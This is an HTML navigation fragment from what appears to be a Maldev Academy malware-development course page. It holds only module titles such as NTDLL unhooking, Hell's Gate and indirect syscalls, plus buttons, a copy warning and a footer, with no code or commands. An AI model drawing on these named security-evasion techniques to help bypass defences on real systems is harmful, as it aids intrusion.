                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-87" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./87.html">
                    <div for="module-87" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 87 - NTDLL Unhooking - From a Web Server
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-88" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./88.html">
                    <div for="module-88" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 88 - Updating Hell's Gate
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-89" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./89.html">
                    <div for="module-89" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 89 - Indirect Syscalls - HellsHall
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-90" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./90.html">
                    <div for="module-90" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 90 - Block DLL Policy
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-91" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./91.html">
                    <div for="module-91" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 91 - Diving Into NtCreateUserProcess
                    </div>
                </a>
            </div>
                </div>
    </div>
</div>          </div>
      </div>

      
      <div class="flex">
  <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 border-r border-l border-gray-600/60 pl-4 pt-2 pb-2 rounded-bl-xl rounded-br-xl shadow-inner">

          <div class="mr-2">
        <a data-target="_self" href="./80.html">
          <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Previous</button>
        </a>
      </div>
    
    <div class="mr-2">
      <a data-target="_self" href="../All Modules.html">
        <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Modules</button>
      </a>
    </div>

    <div class="my-2 mr-2">
      <form id="complete-module" action="./81/complete" method="POST">
      </form>
      <form id="uncomplete-module" action="./81#" method="POST">
      </form>
    </div>

          <div class="mr-2">
        <a data-target="_self" href="./82.html">
          <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Next</button>
        </a>
      </div>
    
  </div>
</div>

      
      <input type="hidden" id="objectives-completed" value="20973">

      
      <div id="copyWarning" class="fixed inset-0 hidden z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm">
  <div class="relative bg-gray-800 border border-gray-600 rounded-2xl shadow-2xl p-8 max-w-lg w-11/12 text-center transform transition-all scale-100">
    <p class="text-2xl font-bold text-white mb-4 tracking-wide">
      Reminder
    </p>
    <p class="text-gray-300 text-base mb-6 leading-relaxed">
      To remain compliant with the Terms of Service, avoid copying the entire module and instead copy the necessary sections.
    </p>
    <button onclick="hideCopyWarning()" class="w-full text-white font-medium rounded-lg text-sm px-5 py-2.5 text-center transition-all duration-200 bg-blue-600/80 hover:bg-blue-500/80 border border-blue-400/40 backdrop-blur-sm backdrop-saturate-150">
      I understand
    </button>
    <span class="absolute top-3 right-3 text-gray-400 hover:text-gray-200 cursor-pointer text-xl" onclick="hideCopyWarning()"></span>
  </div>
</div>

        </div>

  <footer id="footer" class="text-gray-400
    bg-gradient-to-t from-[#101926] via-[#172130] to-[#1e293b] backdrop-blur-md backdrop-saturate-150 z-20 border-t border-gray-700/50 border-gray-800
     hidden body-font">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4"> 2025 Maldev Academy Inc.</p>
        <a href="https://x.com/maldevacademy" target="_blank" class="text-gray-500 hover:text-white ml-2">
          <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 1200 1227" xmlns="http://www.w3.org/2000/svg" style="--darkreader-inline-fill: currentColor;" data-darkreader-inline-fill="">
            <path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z" fill="white" style="--darkreader-inline-fill: var(--darkreader-text-ffffff, #e8e6e3);" data-darkreader-inline-fill=""></path>
          </svg>            
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
          Terms of Service
      </a></span><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
    </a></div><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
  </a></footer></div>
        

        <script src="81_files/jquery-3.6.0.min.js"></script>
        <script src="81_files/bootstrap.min.js"></script>
        <script src="81_files/navbar.js"></script>
        

<link rel="preload" as="style" href="81_files/app-BoiX-DPv.css"><link rel="modulepreload" href="81_files/app-D9jIIQde.js"><link rel="stylesheet" href="81_files/app-BoiX-DPv.css"><style class="darkreader darkreader--sync" media="screen"></style><script type="module" src="81_files/app-D9jIIQde.js"></script><script src="81_files/moduleviewer.js" defer="defer"></script>

</body></html>